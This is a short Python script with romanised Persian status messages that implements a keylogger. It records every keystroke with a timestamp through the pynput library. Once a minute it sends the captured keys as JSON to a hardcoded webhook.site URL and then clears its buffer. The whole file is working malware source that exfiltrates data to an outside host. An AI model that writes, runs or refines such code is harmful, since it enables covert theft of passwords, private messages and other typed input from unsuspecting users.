import requests
from pynput import keyboard 
import datetime
import schedule
import time

webhook_url = "https://webhook.site/d1290e8e-b956-443f-9d6e-b6d49747f18f"

keys_with_timestamps = []

def key_pressed(key):
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f ")
        if hasattr(key,'char'):
            keys_with_timestamps.append((str(key.char), timestamp))
        elif hasattr(key,'vk'):
            nashnas=key.name if hasattr(key, "name") else "nemishnasm"
            keys_with_timestamps.append((" in horof khase :" + nashnas , timestamp))
        else:
            pass
    except Exception as e :
        print(f"man in moshkel ro dashtam erroram ineh  {e}")
        
        
def send_keys_to_webhook(keys_data):
    payload = {"keys": keys_data}
    try:
        response = requests.post(webhook_url , json=payload)
        if response.status_code == 200:
            print(" man etelat ersal kardam  ")
        else:
            print(f" man moshkel daram moshkalamma ineh : {response.status_code}")
    except Exception as e:
        print("error ma dar ersal keys : {e}")


def send_keys_poriodically():
    if keys_with_timestamps:
        send_keys_to_webhook(keys_with_timestamps)
        keys_with_timestamps.clear()
        
        
def start_periodic_sender():
    schedule.every(1).minute.do(send_keys_poriodically)
    while True :
        schedule.run_pending()
        time.sleep(1)
        
        
with keyboard.Listener(on_press= key_pressed) as listener:
    start_periodic_sender()
    listener.join()

